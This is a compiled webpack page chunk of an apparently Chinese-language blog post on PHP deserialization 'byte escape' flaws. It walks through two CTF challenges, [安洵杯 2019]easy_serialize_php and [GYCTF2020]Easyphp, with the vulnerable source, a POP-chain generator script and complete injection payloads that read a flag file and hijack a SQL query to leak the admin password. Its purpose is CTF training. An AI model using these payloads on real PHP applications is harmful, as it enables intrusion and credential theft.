(window.webpackJsonp=window.webpackJsonp||[]).push([[57],{804:function(s,n,a){"use strict";a.r(n);var e=a(79),i=Object(e.a)({},(function(){var s=this,n=s._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"反序列化字节逃逸"}},[s._v("反序列化字节逃逸 "),n("a",{staticClass:"header-anchor",attrs:{href:"#反序列化字节逃逸"}},[s._v("#")])]),s._v(" "),n("p",[s._v("当 PHP 中序列化后的数据进行了长度替换之后，就可能存在这一漏洞，即通过修改输入数据从而控制整个序列化的内容。")]),s._v(" "),n("p",[n("strong",[s._v("[安洵杯 2019]easy_serialize_php")])]),s._v(" "),n("p",[s._v("题目源码")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("<?php\n\n$function = @$_GET['f'];\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\nextract($_POST);\n\nif(!$function){\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\n}\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n$serialize_info = filter(serialize($_SESSION));\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br")])]),n("p",[s._v("在 phpinfo 中发现了文件包含 d0g3_f1ag.php")]),s._v(" "),n("p",[s._v("可以看到在倒数第二行存在一个文件读取")]),s._v(" "),n("p",[s._v("读取的内容是 _SESSION['img']")]),s._v(" "),n("p",[s._v("同时存在一个变量覆盖及序列化数据的替换")]),s._v(" "),n("p",[s._v("首先默认的序列化数据是")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('a:3:{s:4:"user";s:5:"guest";s:8:"function";s:14:"highlight_file";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("这里可以控制的部分是 user 和 function 的内容")]),s._v(" "),n("p",[s._v("于是要利用过滤，用 user 吃掉后面的")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('";s:8:"function";s:14:\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("之后在 function 的部分便可以写入数据控制后面的内容了")]),s._v(" "),n("p",[s._v("要吃掉的数据一共是22个，于是 user 的值为 phpphpphpphpphpphpflag")]),s._v(" "),n("p",[s._v("_SESSION[function] 的值为")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v(';s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:3:"ccc";s:2:"ok";}\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("这里要保证数组内的个数相等，所以要传入两个值")]),s._v(" "),n("p",[s._v("再传入 f = show_image 即可查看文件")]),s._v(" "),n("p",[s._v("之后回显为")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("$flag = 'flag in /d0g3_fllllllag';\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("再次编码查看文件，获得 flag")]),s._v(" "),n("p",[n("strong",[s._v("[GYCTF2020]Easyphp")])]),s._v(" "),n("p",[s._v("这个也是通过改变序列化字节造成的漏洞，和上一个减少不同，这个是增加字节长度")]),s._v(" "),n("p",[s._v("网站根目录下 www.zip 下载题目")]),s._v(" "),n("p",[s._v("先看这个存放类的 lib.php")]),s._v(" "),n("p",[s._v("在登录时用了 User 类的 login 方法")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("class User\n{\n    public $id;\n    public $age=null;\n    public $nickname=null;\n    public function login() {\n        if(isset($_POST['username'])&&isset($_POST['password'])){\n        $mysqli=new dbCtrl();\n        $this->id=$mysqli->login('select id,password from user where username=?');\n        if($this->id){\n        $_SESSION['id']=$this->id;\n        $_SESSION['login']=1;\n        echo \"你的ID是\".$_SESSION['id'];\n        echo \"你好！\".$_SESSION['token'];\n        echo \"<script>window.location.href='./update.php'<\/script>\";\n        return $this->id;\n        }\n    }\n}\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br")])]),n("p",[s._v("而 login 实例化了另一个类 dbCtrl")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("class dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name;\n    public $password;\n    public $mysqli;\n    public $token;\n    public function __construct()\n    {\n        $this->name=$_POST['username'];\n        $this->password=$_POST['password'];\n        $this->token=$_SESSION['token'];\n    }\n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n}\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br")])]),n("p",[s._v("这是一个执行查询语句的方法，同时 token 要设成 admin 才会返回结果")]),s._v(" "),n("p",[s._v("而 update.php 则使用了 update 方法")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("public function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n    }\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br")])]),n("p",[s._v("这里可以看到第一行反序列化了 getNewinfo()")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v(" public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br")])]),n("p",[s._v("以及 Info 类")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("class Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br")])]),n("p",[s._v("safe方法")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("function safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br")])]),n("p",[s._v("之后实例化了新的类 UpdateHelper")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("Class UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br")])]),n("p",[s._v("在这个类里也实例化了 dbCtrl")]),s._v(" "),n("p",[s._v("同时在 User 类里存在")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('public function __destruct(){\n    return file_get_contents($this->nickname);//危\n}\npublic function __toString()\n{\n    $this->nickname->update($this->age);\n    return "0-0";\n}\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br")])]),n("p",[s._v("然后来总结一下出现的魔术方法")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("__construct()    当一个对象创建时被调用\n__destruct()     当一个对象销毁时被调用\n__toString()     当一个对象被当作一个字符串使用\n__call           当调用的方法不存在时触发\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br")])]),n("p",[s._v("最终目的是改变 dbCtrl 中的查询语句从而查出账号密码")]),s._v(" "),n("p",[s._v("我们可以看到在 getNewInfo 中存在 safe 方法的替换，改变了序列化数据的长度")]),s._v(" "),n("p",[s._v("UpdateHelper 类的 __destruct() 首先用通过 echo 调用 __toString，通过将 nickname 实例化为 Info 调用 Info 中的 call")]),s._v(" "),n("p",[s._v("再将 CtrlCase 实例化为 dbCtrl，从而调用 dbCtrl 中的 login 方法")]),s._v(" "),n("p",[s._v("原本在 update() 中序列化的内容为")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";N;}\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("然后通过 safe 的过滤把反序列化数据挤出去，为保证对象个数的一致，这里要写进 CtrlCase 对象")]),s._v(" "),n("p",[s._v("编写以下脚本进行序列化")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('<?php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    }\nclass User\n{\n    public $id;\n    public $age="select password,id from user where username=?";\n    public $nickname;\n}\nclass UpdateHelper\n{\n   public $id;\n   public $newinfo;\n   public $sql;\n}\nclass dbCtrl\n{\n   public $hostname="127.0.0.1";\n   public $dbuser="root";\n   public $dbpass="root";\n   public $database="test";\n   public $name=\'admin\';\n   public $password;\n   public $mysqli;\n   public $token=\'admin\';\n}\n$d = new dbCtrl();\n$i = new Info();\n$i->CtrlCase=$d;\n$u = new user();\n$u->nickname=$i;\n$U=new UpdateHelper();\n$U->sql=$u;\n\necho serialize($U);\n\n?>\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br")])]),n("p",[s._v("之后作为 CtrlCase 的值传入")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("一共 443 字节")]),s._v(" "),n("p",[s._v("用 80 个单引号和三个 union 挤出这部分")]),s._v(" "),n("p",[s._v("完整payload")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("age=&nickname=''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''unionunionunion\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}}\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])])])}),[],!1,null,null,null);n.default=i.exports}}]);